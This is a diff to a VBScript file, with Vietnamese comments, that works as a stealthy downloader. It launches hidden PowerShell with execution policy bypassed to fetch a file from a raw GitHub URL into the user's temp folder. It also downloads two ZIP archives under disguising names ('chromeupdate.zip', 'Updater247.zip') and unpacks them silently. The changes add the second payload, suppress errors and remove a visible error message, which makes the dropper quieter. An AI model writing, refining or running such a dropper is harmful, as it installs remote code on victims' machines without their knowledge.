@@ -1,42 +1,54 @@
-Dim http, url2, tempFolder, zip2
-Dim shell, fso, stream, txtPath, scriptName
+Option Explicit
 
+'=============================
+' KHAI BÁO BIẾN
+'=============================
+Dim shell, fso, http, stream
+Dim scriptPath, scriptName, tempFolder, txtPath
+Dim url1, url2, zip1, zip2, rawUrl
 
 Set shell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
+Set fso   = CreateObject("Scripting.FileSystemObject")
 
-' Lấy đường dẫn và tên script hiện tại
+'=============================
+' THIẾT LẬP ĐƯỜNG DẪN
+'=============================
 scriptPath = WScript.ScriptFullName
 scriptName = fso.GetBaseName(scriptPath)
-
-' Đường dẫn thư mục tạm và file txt cùng tên
 tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"
-txtPath = tempFolder & scriptName & ".txt"
+txtPath    = tempFolder & scriptName & ".txt"
 
-' Tải file txt từ GitHub
+'=============================
+' URL NGUỒN DỮ LIỆU
+'=============================
 rawUrl = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/content"
-cmd1 = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
-  """(New-Object Net.WebClient).DownloadFile('" & rawUrl & "','" & txtPath & "')"""
-shell.Run cmd1, 0, True
+url1   = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv1.zip"
+url2   = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv2.zip"
+zip1   = tempFolder & "Updater247.zip"
+zip2   = tempFolder & "chromeupdate.zip"
 
+'=============================
+' TẢI FILE TXT (CHỈ KHI CHƯA CÓ)
+'=============================
+If Not fso.FileExists(txtPath) Then
+    shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+        """(New-Object Net.WebClient).DownloadFile('" & rawUrl & "','" & txtPath & "')""", 0, True
+End If
 
-' URL của các file ZIP
-
-url2 = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv2.zip"
-
-' Lấy thư mục Temp thật của hệ thống
-Set shell = CreateObject("WScript.Shell")
-tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"
-
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set shell = CreateObject("Shell.Application")
-
-' =============================
-' Hàm tải file ZIP và đổi tên
+'=============================
+' HÀM DOWNLOAD FILE (silent)
+'=============================
 Function DownloadFile(url, savePath)
+    On Error Resume Next
+    If fso.FileExists(savePath) Then
+        DownloadFile = True
+        Exit Function
+    End If
+
     Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
     http.Open "GET", url, False
     http.Send
+
     If http.Status = 200 Then
         Set stream = CreateObject("ADODB.Stream")
         stream.Type = 1 ' Binary
@@ -46,36 +58,42 @@ Function DownloadFile(url, savePath)
         stream.Close
         DownloadFile = True
     Else
-        MsgBox "Lỗi tải file: " & url
         DownloadFile = False
     End If
+    On Error GoTo 0
 End Function
 
-' =============================
-' Hàm giải nén vào thư mục cùng tên
+'=============================
+' HÀM GIẢI NÉN ZIP (silent)
+'=============================
 Sub ExtractZip(zipPath, targetFolder)
-     Dim shApp, zipFile, outFolder
-    
-    ' Tạo đối tượng Shell.Application riêng để giải nén
+    On Error Resume Next
+    Dim shApp, zipFile, outFolder
     Set shApp = CreateObject("Shell.Application")
-    
-    ' Nếu thư mục đích chưa có thì tạo
-    If Not fso.FolderExists(targetFolder) Then
-        fso.CreateFolder targetFolder
-    End If
-    
-    Set zipFile = shApp.Namespace(zipPath)
+
+    ' Nếu thư mục đã tồn tại → bỏ qua
+    If fso.FolderExists(targetFolder) Then Exit Sub
+
+    Set zipFile   = shApp.Namespace(zipPath)
     Set outFolder = shApp.Namespace(targetFolder)
-    
+
     If Not zipFile Is Nothing And Not outFolder Is Nothing Then
+        fso.CreateFolder targetFolder
         outFolder.CopyHere zipFile.Items, 4 + 16
-    Else
     End If
+    On Error GoTo 0
 End Sub
 
-' =============================
-' Xử lý PyEnv2.zip
-zip2 = tempFolder & "chromeupdate.zip"
+'=============================
+' TẢI & GIẢI NÉN PYV1.ZIP
+'=============================
+If DownloadFile(url1, zip1) Then
+    ExtractZip zip1, tempFolder & "Updater247"
+End If
+
+'=============================
+' TẢI & GIẢI NÉN PYV2.ZIP
+'=============================
 If DownloadFile(url2, zip2) Then
     ExtractZip zip2, tempFolder & "chromeupdate"
 End If
